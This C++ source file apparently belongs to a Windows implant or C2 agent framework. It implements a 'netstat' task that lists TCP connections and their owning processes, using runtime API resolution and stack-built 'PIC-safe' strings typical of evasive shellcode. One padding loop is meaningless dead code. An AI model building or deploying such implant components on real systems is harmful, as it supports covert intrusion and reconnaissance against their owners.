#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_NETSTAT

using namespace stardust;
using namespace starburst;

typedef struct _MIB_TCPROW_OWNER_PID {
    DWORD dwState;
    DWORD dwLocalAddr;
    DWORD dwLocalPort;
    DWORD dwRemoteAddr;
    DWORD dwRemotePort;
    DWORD dwOwningPid;
} MIB_TCPROW_OWNER_PID;

typedef struct _MIB_TCPTABLE_OWNER_PID {
    DWORD                 dwNumEntries;
    MIB_TCPROW_OWNER_PID  table[1];
} MIB_TCPTABLE_OWNER_PID;

typedef DWORD (WINAPI *fn_GetExtendedTcpTable)( PVOID, PDWORD, BOOL, ULONG, INT, ULONG );

static auto declfn format_ip( char* buf, DWORD ip ) -> uint32_t {
    uint8_t b[4];
    b[0] = ip & 0xFF;
    b[1] = (ip >> 8) & 0xFF;
    b[2] = (ip >> 16) & 0xFF;
    b[3] = (ip >> 24) & 0xFF;

    uint32_t off = 0;
    for ( int i = 0; i < 4; i++ ) {
        char num[4];
        int_to_str( num, b[i], 10 );
        uint32_t nlen = str_len( num );
        memory::copy( buf + off, num, nlen );
        off += nlen;
        if ( i < 3 ) buf[off++] = '.';
    }
    buf[off] = '\0';
    return off;
}

static auto declfn write_state( char* buf, DWORD state ) -> uint32_t {
    // PIC-safe: build state strings on stack, no .rodata references
    char s[16] = { 0 };
    switch ( state ) {
        case 1:  s[0]='C';s[1]='L';s[2]='O';s[3]='S';s[4]='E';s[5]='D'; break;
        case 2:  s[0]='L';s[1]='I';s[2]='S';s[3]='T';s[4]='E';s[5]='N'; break;
        case 3:  s[0]='S';s[1]='Y';s[2]='N';s[3]='_';s[4]='S';s[5]='E';s[6]='N';s[7]='T'; break;
        case 4:  s[0]='S';s[1]='Y';s[2]='N';s[3]='_';s[4]='R';s[5]='C';s[6]='V';s[7]='D'; break;
        case 5:  s[0]='E';s[1]='S';s[2]='T';s[3]='A';s[4]='B';s[5]='L';s[6]='I';s[7]='S';s[8]='H';s[9]='E';s[10]='D'; break;
        case 6:  s[0]='F';s[1]='I';s[2]='N';s[3]='_';s[4]='W';s[5]='A';s[6]='I';s[7]='T';s[8]='1'; break;
        case 7:  s[0]='F';s[1]='I';s[2]='N';s[3]='_';s[4]='W';s[5]='A';s[6]='I';s[7]='T';s[8]='2'; break;
        case 8:  s[0]='C';s[1]='L';s[2]='O';s[3]='S';s[4]='E';s[5]='_';s[6]='W';s[7]='A';s[8]='I';s[9]='T'; break;
        case 9:  s[0]='C';s[1]='L';s[2]='O';s[3]='S';s[4]='I';s[5]='N';s[6]='G'; break;
        case 10: s[0]='L';s[1]='A';s[2]='S';s[3]='T';s[4]='_';s[5]='A';s[6]='C';s[7]='K'; break;
        case 11: s[0]='T';s[1]='I';s[2]='M';s[3]='E';s[4]='_';s[5]='W';s[6]='A';s[7]='I';s[8]='T'; break;
        case 12: s[0]='D';s[1]='E';s[2]='L';s[3]='E';s[4]='T';s[5]='E';s[6]='_';s[7]='T';s[8]='C';s[9]='B'; break;
        default: s[0]='U';s[1]='N';s[2]='K';s[3]='N';s[4]='O';s[5]='W';s[6]='N'; break;
    }
    uint32_t len = str_len( s );
    memory::copy( buf, s, len );
    buf[len] = '\0';
    return len;
}

auto declfn starburst::cmd_netstat(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    auto h_iphlpapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA(
        symbol<LPCSTR>( "iphlpapi.dll" ) ) );
    if ( !h_iphlpapi ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "LoadLibrary iphlpapi failed" ) ) );
        return;
    }

    auto pGetExtendedTcpTable = reinterpret_cast<fn_GetExtendedTcpTable>(
        inst.kernel32.GetProcAddress( h_iphlpapi,
            symbol<LPCSTR>( "GetExtendedTcpTable" ) ) );
    if ( !pGetExtendedTcpTable ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetExtendedTcpTable not found" ) ) );
        return;
    }

    DWORD buf_size = 0;
    pGetExtendedTcpTable( nullptr, &buf_size, FALSE, AF_INET, 5 /* TCP_TABLE_OWNER_PID_ALL */, 0 );

    auto table = static_cast<MIB_TCPTABLE_OWNER_PID*>( inst.heap_alloc( buf_size ) );
    if ( !table ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    if ( pGetExtendedTcpTable( table, &buf_size, TRUE, AF_INET, 5, 0 ) != 0 ) {
        inst.heap_free( table );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetExtendedTcpTable failed" ) ) );
        return;
    }

    uint32_t out_cap = 32768;
    auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
    if ( !output ) {
        inst.heap_free( table );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    uint32_t off = 0;
    str_copy( output + off, symbol<char*>( const_cast<char*>(
        "Proto  Local Address          Foreign Address        State           PID\n" ) ) );
    off = str_len( output );

    for ( DWORD i = 0; i < table->dwNumEntries && off + 128 < out_cap; i++ ) {
        auto& row = table->table[i];

        str_copy( output + off, symbol<char*>( const_cast<char*>( "TCP    " ) ) );
        off += 7;

        // local addr:port
        char ip_buf[24];
        uint32_t ip_len = format_ip( ip_buf, row.dwLocalAddr );
        memory::copy( output + off, ip_buf, ip_len );
        off += ip_len;
        output[off++] = ':';
        char port_buf[8];
        uint16_t lport = static_cast<uint16_t>( ( (row.dwLocalPort & 0xFF) << 8 ) | ( (row.dwLocalPort >> 8) & 0xFF ) );
        int_to_str( port_buf, lport, 10 );
        uint32_t plen = str_len( port_buf );
        memory::copy( output + off, port_buf, plen );
        off += plen;

        // pad to column
        while ( off < str_len( output ) || (off % 1) ) {
            uint32_t col = off - (str_len(output) - off);
            break;
        }
        // simple padding
        uint32_t local_field_len = ip_len + 1 + plen;
        for ( uint32_t pad = local_field_len; pad < 23; pad++ ) output[off++] = ' ';

        // remote addr:port
        ip_len = format_ip( ip_buf, row.dwRemoteAddr );
        memory::copy( output + off, ip_buf, ip_len );
        off += ip_len;
        output[off++] = ':';
        uint16_t rport = static_cast<uint16_t>( ( (row.dwRemotePort & 0xFF) << 8 ) | ( (row.dwRemotePort >> 8) & 0xFF ) );
        int_to_str( port_buf, rport, 10 );
        plen = str_len( port_buf );
        memory::copy( output + off, port_buf, plen );
        off += plen;

        uint32_t remote_field_len = ip_len + 1 + plen;
        for ( uint32_t pad = remote_field_len; pad < 23; pad++ ) output[off++] = ' ';

        // state
        char st_buf[16] = { 0 };
        uint32_t st_len = write_state( st_buf, row.dwState );
        memory::copy( output + off, st_buf, st_len );
        off += st_len;
        for ( uint32_t pad = st_len; pad < 16; pad++ ) output[off++] = ' ';

        // PID
        int_to_str( port_buf, row.dwOwningPid, 10 );
        plen = str_len( port_buf );
        memory::copy( output + off, port_buf, plen );
        off += plen;

        output[off++] = '\n';
    }

    output[off] = '\0';
    inst.heap_free( table );
    queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
    inst.heap_free( output );
}

#endif
